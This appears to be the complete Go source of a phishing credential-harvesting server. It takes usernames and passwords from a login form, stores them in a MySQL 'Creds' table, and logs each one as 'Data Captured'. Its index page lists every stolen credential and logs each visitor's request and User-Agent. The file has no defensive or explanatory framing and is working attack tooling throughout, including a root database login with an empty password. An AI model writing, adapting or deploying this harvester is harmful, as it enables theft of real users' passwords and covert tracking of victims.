package main

import (
	"database/sql"
	"fmt"
	"html/template"
	"log"
	"net/http"

	_ "github.com/go-sql-driver/mysql"
)

type Creds struct {
	Id          int
	Username    string
	Supersecret string
}

func dbConn() (db *sql.DB) {
	dbDriver := "mysql"
	dbUser := "root"
	dbPass := ""
	dbName := "godb"
	db, err := sql.Open(dbDriver, dbUser+":"+dbPass+"@/"+dbName)
	if err != nil {
		panic(err.Error())
	}
	return db
}

var tpl *template.Template

func init() {
	tpl = template.Must(template.ParseGlob("templates/*.html"))
}
func main() {
	http.HandleFunc("/", index)
	http.HandleFunc("/process", process)
	log.Fatal(http.ListenAndServe("172.20.20.20:80", nil))
}

func index(w http.ResponseWriter, r *http.Request) {
	db := dbConn()
	selDB, err := db.Query("SELECT * FROM Creds ORDER BY id DESC")
	if err != nil {
		panic(err.Error())
	}
	emp := Creds{}
	res := []Creds{}
	for selDB.Next() {
		var id int
		var username string
		var supersecret string
		err = selDB.Scan(&id, &username, &supersecret)
		if err != nil {
			panic(err.Error())
		}
		emp.Id = id
		emp.Username = username
		emp.Supersecret = supersecret

		res = append(res, emp)
	}
	tpl.ExecuteTemplate(w, "index.html", res)
	ua := r.Header.Get("User-Agent")
	url := fmt.Sprintf("%v %v %v %v %v", r.Method, r.URL, r.Proto, r.Host, ua)
	fmt.Printf("Tracking: %s \n", url)
	return

}

func process(w http.ResponseWriter, r *http.Request) {
	db := dbConn()
	if r.Method == "POST" {
		user := r.FormValue("nameBox")
		pass := r.FormValue("pwdBox")
		insForm, err := db.Prepare("INSERT INTO Creds(username, supersecret ) VALUES(?,?)")
		if err != nil {
			panic(err.Error())
		}
		insForm.Exec(user, pass)
		log.Println("Data Captured!!!!!! " + "Username: " + user + " | Supersecret: " + pass)
	}
	defer db.Close()
	http.Redirect(w, r, "d", 301)
}
